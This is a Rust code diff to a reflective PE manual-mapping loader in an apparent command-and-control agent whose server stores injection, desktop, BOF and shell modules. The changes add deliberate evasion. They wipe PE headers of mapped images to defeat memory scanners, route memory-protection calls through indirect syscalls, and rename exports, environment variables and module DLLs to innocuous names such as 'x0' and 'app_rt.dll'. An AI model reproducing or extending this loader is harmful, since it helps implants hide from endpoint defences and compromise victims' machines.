@@ -161,11 +161,24 @@ pub fn map_pe_opts(pe: &[u8], call_dll_main: bool) -> Result<MappedModule, Strin
         return Err(format!("pe_map: unknown optional magic 0x{magic:x}"));
     };
 
-    // Static TLS + DllMain on Manual-Map of MSVC/Rust CRT often AV. Fail closed so
-    // module_loader can LoadLibrary-fallback without killing the process.
+    // Static TLS: user mode cannot safely register a manually-mapped image
+    // with ntdll's static-TLS table (see the long comment above
+    // `neuter_tls`). On the real load path (call_dll_main=true) the module
+    // will run x0..x3, and product modules touch thread_local there — with
+    // no valid TLS block the first access AVs (confirmed crash at the
+    // `gs:[0x58]` accessor inside x0). Fail closed BEFORE allocating so
+    // module_loader engages the OS-loader (LoadLibrary) fallback.
+    // The export-probe path (call_dll_main=false) tolerates the directory
+    // later via `neuter_tls` — it never runs module code.
     if call_dll_main && tls_rva != 0 {
         return Err(
-            "pe_map: TLS directory present — refuse DllMain Manual-Map (use OS loader fallback)"
+            "pe_map: TLS directory present — module thread_local would fault under Manual-Map; use OS loader (LoadLibrary) fallback".into(),
+        );
+    }
+    #[cfg(target_arch = "x86")]
+    if tls_rva != 0 {
+        return Err(
+            "pe_map: TLS directory present — x86 Manual-Map unsupported (use OS loader fallback)"
                 .into(),
         );
     }
@@ -184,6 +197,10 @@ pub fn map_pe_opts(pe: &[u8], call_dll_main: bool) -> Result<MappedModule, Strin
 
     let base_ptr = nt_alloc_rw(size_of_image, true).map_err(|e| format!("pe_map alloc: {e}"))?;
     let base = base_ptr as usize;
+    crate::utils::db_print(&format!(
+        "[pe_map] alloc base=0x{:X} soi=0x{:X} hdrs=0x{:X} entry_rva=0x{:X} tls_rva=0x{:X} reloc_rva=0x{:X}",
+        base, size_of_image, size_of_headers, entry_rva, tls_rva, reloc_rva
+    ));
 
     // Copy headers
     unsafe {
@@ -217,6 +234,7 @@ pub fn map_pe_opts(pe: &[u8], call_dll_main: bool) -> Result<MappedModule, Strin
             std::ptr::copy_nonoverlapping(pe.as_ptr().add(raw_ptr), base_ptr.add(va), copy_len);
         }
     }
+    crate::utils::db_print("[pe_map] sections copied");
 
     // Relocations
     let delta = base.wrapping_sub(image_base) as isize;
@@ -228,6 +246,7 @@ pub fn map_pe_opts(pe: &[u8], call_dll_main: bool) -> Result<MappedModule, Strin
             return Err(e);
         }
     }
+    crate::utils::db_print(&format!("[pe_map] relocs done delta=0x{:X}", delta as usize));
 
     // Imports
     if import_rva != 0 {
@@ -238,6 +257,21 @@ pub fn map_pe_opts(pe: &[u8], call_dll_main: bool) -> Result<MappedModule, Strin
             return Err(e);
         }
     }
+    crate::utils::db_print("[pe_map] imports resolved");
+
+    // Static TLS, export-probe path only (call_dll_main=false — the
+    // call_dll_main=true case refused TLS images up front). Sentinel-neuter
+    // the directory so scanners don't follow stale VAs; module code never
+    // runs here, so the sentinel can't fault.
+    if tls_rva != 0 {
+        if let Err(e) = unsafe { neuter_tls(base, size_of_image, image_base, tls_rva) } {
+            unsafe {
+                wipe_and_free(base_ptr, size_of_image);
+            }
+            return Err(e);
+        }
+    }
+    crate::utils::db_print("[pe_map] tls handled");
 
     // Section protections (no lingering RWX when avoidable)
     if let Err(e) =
@@ -246,6 +280,7 @@ pub fn map_pe_opts(pe: &[u8], call_dll_main: bool) -> Result<MappedModule, Strin
         warn!("[pe_map] protect_sections: {e}");
         // non-fatal: leave RW
     }
+    crate::utils::db_print("[pe_map] protections set");
 
     // DllMain for CRT/static init (Rust cdylib often needs this).
     // Complex CRT/TLS modules may AV here — product path falls back to LoadLibrary.
@@ -254,7 +289,12 @@ pub fn map_pe_opts(pe: &[u8], call_dll_main: bool) -> Result<MappedModule, Strin
         type DllMainFn =
             unsafe extern "system" fn(*mut core::ffi::c_void, u32, *mut core::ffi::c_void) -> i32;
         let entry: DllMainFn = unsafe { std::mem::transmute(base + entry_rva) };
+        crate::utils::db_print(&format!(
+            "[pe_map] calling DllMain entry=0x{:X}",
+            base + entry_rva
+        ));
         let ok = unsafe { entry(base as *mut _, DLL_PROCESS_ATTACH, std::ptr::null_mut()) };
+        crate::utils::db_print(&format!("[pe_map] DllMain returned {}", ok));
         if ok == 0 {
             unsafe {
                 wipe_and_free(base_ptr, size_of_image);
@@ -264,15 +304,16 @@ pub fn map_pe_opts(pe: &[u8], call_dll_main: bool) -> Result<MappedModule, Strin
         dll_main_called = true;
     }
 
-    // Resolve L2 exports by walking export dir (not GetProcAddress — image not in loader list)
+    // Resolve L2 exports by walking export dir (not GetProcAddress — image not in loader list).
+    // Neutral ABI names: x0=init, x1=invoke, x2=free, x3=shutdown (see modules/bof).
     let mod_init =
-        unsafe { resolve_export(base, size_of_image, export_rva, export_size, b"mod_init") }
+        unsafe { resolve_export(base, size_of_image, export_rva, export_size, b"x0") }
             .map(|a| unsafe { std::mem::transmute(a) });
     let mod_invoke =
-        unsafe { resolve_export(base, size_of_image, export_rva, export_size, b"mod_invoke") }
+        unsafe { resolve_export(base, size_of_image, export_rva, export_size, b"x1") }
             .map(|a| unsafe { std::mem::transmute(a) });
     let mod_free =
-        unsafe { resolve_export(base, size_of_image, export_rva, export_size, b"mod_free") }
+        unsafe { resolve_export(base, size_of_image, export_rva, export_size, b"x2") }
             .map(|a| unsafe { std::mem::transmute(a) });
     let mod_shutdown = unsafe {
         resolve_export(
@@ -280,14 +321,23 @@ pub fn map_pe_opts(pe: &[u8], call_dll_main: bool) -> Result<MappedModule, Strin
             size_of_image,
             export_rva,
             export_size,
-            b"mod_shutdown",
+            b"x3",
         )
     }
     .map(|a| unsafe { std::mem::transmute(a) });
 
     if mod_invoke.is_none() {
         let _ = unmap_pe_inner(base, size_of_image, dll_main_called);
-        return Err("pe_map: export mod_invoke not found".into());
+        return Err("pe_map: required export missing".into());
+    }
+
+    // OPSEC: wipe DOS/NT headers of the mapped image. Export VAs are captured
+    // above and nothing downstream parses the header, so zeroing it defeats
+    // memory scanners that match PE image headers inside the agent process.
+    // (Header region stays in the initial RW allocation; sections keep their
+    // own protections.)
+    unsafe {
+        wipe_mapped_headers(base_ptr, size_of_headers);
     }
 
     debug!(
@@ -303,6 +353,18 @@ pub fn map_pe_opts(pe: &[u8], call_dll_main: bool) -> Result<MappedModule, Strin
         mod_shutdown,
         dll_main_called,
     })
+}
+
+/// Zero the first `len` bytes (PE headers) of a mapped image. Best-effort:
+/// a protection anomaly simply skips the wipe rather than failing the load.
+unsafe fn wipe_mapped_headers(base: *mut u8, len: usize) {
+    if base.is_null() || len == 0 {
+        return;
+    }
+    // protect_sections leaves headers PAGE_READONLY — flip RW, wipe, restore R
+    protect(base as usize, len, PAGE_READWRITE);
+    std::ptr::write_bytes(base, 0, len);
+    protect(base as usize, len, PAGE_READONLY);
 }
 
 /// Unmap a previously mapped module (DllMain detach + wipe + free).
@@ -352,13 +414,15 @@ fn unmap_pe_inner(base: usize, size: usize, dll_main_called: bool) -> Result<(),
                         let mut old = 0u32;
                         let mut b = base;
                         let mut region = size;
-                        let _ = crate::syscall_nt!(
+                        let _ = crate::native::process::invoke_nt(
                             b"NtProtectVirtualMemory",
-                            0xFFFFFFFFFFFFFFFFusize,
-                            &mut b as *mut usize,
-                            &mut region as *mut usize,
-                            PAGE_EXECUTE_READWRITE,
-                            &mut old as *mut u32,
+                            &[
+                                usize::MAX, // NtCurrentProcess()
+                                &mut b as *mut usize as usize,
+                                &mut region as *mut usize as usize,
+                                PAGE_EXECUTE_READWRITE as usize,
+                                &mut old as *mut u32 as usize,
+                            ],
                         );
                         let entry: DllMainFn = std::mem::transmute(base + entry_rva);
                         let _ = entry(base as *mut _, DLL_PROCESS_DETACH, std::ptr::null_mut());
@@ -367,10 +431,97 @@ fn unmap_pe_inner(base: usize, size: usize, dll_main_called: bool) -> Result<(),
             }
         }
     }
+    // Static TLS was neutered at map time (sentinel index + zeroed
+    // directory), so there is no loader-side TLS state to tear down here.
     unsafe {
         wipe_and_free(base as *mut u8, size);
     }
     Ok(())
+}
+
+// ─── Static TLS: tolerated on probes, REFUSED on the real load path ────────
+//
+// Earlier revisions tried to emulate the loader's TLS bookkeeping (TlsAlloc an
+// index, then walk every thread's TEB->ThreadLocalStoragePointers and install a
+// block). A live probe (Win11) proved that is unsafe: kernel32 `TlsAlloc`
+// indices are stored in the TEB's *inline* `TlsSlots[]` / `TlsExpansionSlots`,
+// which is a SEPARATE index space from the loader table at
+// `TEB->ThreadLocalStoragePointers` that local-exec TLS accesses actually read
+// (`gs:[0x58]` on x64). Writing a `TlsAlloc` index into the loader table
+// therefore collided with real in-use loader entries and corrupted host TLS
+// state (manifested as heap-corruption / AV only under parallel test load).
+//
+// A later revision neutered TLS (sentinel below) on the assumption that
+// product modules never touch thread_local in x0..x3 / DllMain. That was
+// WRONG: a live run showed mod_bof's x0 AVs at the local-exec accessor
+// (`mov eax,[_tls_index] ; mov rcx,gs:[58h] ; mov rax,[rcx+rax*8]`) because
+// the tokio runtime context / stack-noise state IS thread_local. Any module
+// that touches thread_local cannot run under Manual-Map without a real TLS
+// block, and user mode cannot safely allocate one.
+//
+// Current policy:
+//
+//   1. call_dll_main=true (real load, module code will run): refuse images
+//      with a TLS directory up front → module_loader falls back to the OS
+//      loader (LoadLibrary), which allocates a proper TLS block.
+//   2. call_dll_main=false (export probe, no code runs): tolerate the
+//      directory, point `AddressOfIndex` at a sentinel and zero the
+//      directory so scanners/dumpers don't follow stale VAs.
+//
+// No TLS callbacks are executed: rustc's callback only dispatches thread
+// destructors on detach reasons and nothing here registers destructors.
+
+/// Sentinel written to the image's `AddressOfIndex` variable. Deliberately
+/// huge: `ThreadLocalStoragePointers[SENTINEL]` is far past the loader table,
+/// so a stray local-exec TLS read takes a clean AV at the access site.
+#[cfg(target_arch = "x86_64")]
+const TLS_SENTINEL_INDEX: u32 = 0x7FFF_FFFF;
+
+/// Neutralize a mapped image's static TLS while it is still RW.
+/// IMAGE_TLS_DIRECTORY64 fields are VAs; base relocs normally fixed them, but
+/// if the linker omitted reloc entries for the directory we translate by the
+/// load delta manually (same `fix` heuristic used previously).
+#[cfg(target_arch = "x86_64")]
+unsafe fn neuter_tls(
+    base: usize,
+    size_of_image: usize,
+    image_base: usize,
+    tls_rva: usize,
+) -> Result<(), String> {
+    if tls_rva + 40 > size_of_image {
+        return Err("pe_map: TLS directory OOB".into());
+    }
+    let dir = base + tls_rva;
+    let index_va = *((dir + 16) as *const u64) as usize;
+
+    let fix = |va: usize| -> usize {
+        if va >= base && va < base + size_of_image {
+            va
+        } else {
+            va.wrapping_sub(image_base).wrapping_add(base)
+        }
+    };
+    let index_ptr = fix(index_va);
+    if index_ptr < base || index_ptr + 4 > base + size_of_image {
+        return Err("pe_map: TLS AddressOfIndex outside image".into());
+    }
+
+    // Sentinel index, then wipe the directory (image is still RW here).
+    *(index_ptr as *mut u32) = TLS_SENTINEL_INDEX;
+    std::ptr::write_bytes(dir as *mut u8, 0, 40);
+    Ok(())
+}
+
+#[cfg(not(target_arch = "x86_64"))]
+unsafe fn neuter_tls(
+    _base: usize,
+    _size_of_image: usize,
+    _image_base: usize,
+    _tls_rva: usize,
+) -> Result<(), String> {
+    // Non-x64 hosts refuse TLS images earlier in map_pe_opts; this stub only
+    // exists so the call site compiles on all targets.
+    Err("pe_map: TLS neutering unsupported on this target".into())
 }
 
 fn dir_rva(pe: &[u8], dd_base: usize, index: usize) -> usize {
@@ -601,13 +752,17 @@ unsafe fn protect(addr: usize, size: usize, new_prot: u32) {
     let mut base = addr;
     let mut region = size;
     let mut old = 0u32;
-    let _ = crate::syscall_nt!(
+    // invoke_nt: indirect syscall with D/Invoke secondary — a silent failure
+    // here leaves pages RW (DEP hazard for image code execution).
+    let _ = crate::native::process::invoke_nt(
         b"NtProtectVirtualMemory",
-        0xFFFFFFFFFFFFFFFFusize,
-        &mut base as *mut usize,
-        &mut region as *mut usize,
-        new_prot,
-        &mut old as *mut u32,
+        &[
+            usize::MAX, // NtCurrentProcess()
+            &mut base as *mut usize as usize,
+            &mut region as *mut usize as usize,
+            new_prot as usize,
+            &mut old as *mut u32 as usize,
+        ],
     );
 }
 
@@ -680,13 +835,15 @@ unsafe fn wipe_and_free(ptr: *mut u8, size: usize) {
         let mut base = ptr as usize;
         let mut region = size;
         let mut old = 0u32;
-        let _ = crate::syscall_nt!(
+        let _ = crate::native::process::invoke_nt(
             b"NtProtectVirtualMemory",
-            0xFFFFFFFFFFFFFFFFusize,
-            &mut base as *mut usize,
-            &mut region as *mut usize,
-            PAGE_READWRITE,
-            &mut old as *mut u32,
+            &[
+                usize::MAX, // NtCurrentProcess()
+                &mut base as *mut usize as usize,
+                &mut region as *mut usize as usize,
+                PAGE_READWRITE as usize,
+                &mut old as *mut u32 as usize,
+            ],
         );
         std::ptr::write_bytes(ptr, 0, size);
     }
@@ -695,7 +852,7 @@ unsafe fn wipe_and_free(ptr: *mut u8, size: usize) {
 
 /// Runtime: should we attempt Manual-Map?
 pub fn mem_map_enabled() -> bool {
-    if let Ok(v) = std::env::var("CUPCAKE_MEM_MAP") {
+    if let Ok(v) = std::env::var("APP_MEM_MAP") {
         let t = v.trim();
         if t == "0" || t.eq_ignore_ascii_case("false") || t.eq_ignore_ascii_case("off") {
             return false;
@@ -709,7 +866,7 @@ pub fn mem_map_strict() -> bool {
     if cfg!(feature = "mem-map-strict") {
         return true;
     }
-    if let Ok(v) = std::env::var("CUPCAKE_MEM_MAP_STRICT") {
+    if let Ok(v) = std::env::var("APP_MEM_MAP_STRICT") {
         let t = v.trim();
         if t == "1" || t.eq_ignore_ascii_case("true") || t.eq_ignore_ascii_case("on") {
             return true;
@@ -740,6 +897,7 @@ mod tests {
     }
 
     /// Product L2 PE fixtures (never shell.bin — product modules only).
+    /// v2: only the bof module (cdylib) is in-process mappable; inject/ad are worker EXEs.
     fn find_product_l2_pe() -> Option<PathBuf> {
         if let Ok(p) = std::env::var("CUPCAKE_TEST_MOD_PE") {
             let pb = PathBuf::from(p);
@@ -749,14 +907,11 @@ mod tests {
         }
         let root = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
         let candidates = [
-            root.join("../../server/storage/modules/inject.bin"),
-            root.join("../../server/storage/modules/desktop.bin"),
-            root.join("../target/release/cupcake_mod_inject.dll"),
-            root.join("../target/release/cupcake_mod_desktop.dll"),
-            root.join("../../Client/target/release/cupcake_mod_inject.dll"),
-            root.join("../../Client/target/release/cupcake_mod_desktop.dll"),
-            PathBuf::from("server/storage/modules/inject.bin"),
-            PathBuf::from("server/storage/modules/desktop.bin"),
+            root.join("../../server/storage/modules/bof.bin"),
+            root.join("../target/release/app_rt.dll"),
+            root.join("../../Client/target/release/app_rt.dll"),
+            root.join("../target/release/cupcake_mod_bof.dll"),
+            PathBuf::from("server/storage/modules/bof.bin"),
         ];
         candidates.into_iter().find(|p| p.is_file())
     }
@@ -765,7 +920,7 @@ mod tests {
     #[test]
     fn map_real_product_exports_without_dllmain() {
         let Some(path) = find_product_l2_pe() else {
-            eprintln!("skip: no product L2 PE (set CUPCAKE_TEST_MOD_PE or build inject/desktop)");
+            eprintln!("skip: no product L2 PE (set CUPCAKE_TEST_MOD_PE or build inject)");
             return;
         };
         let pe = std::fs::read(&path).expect("read product pe");
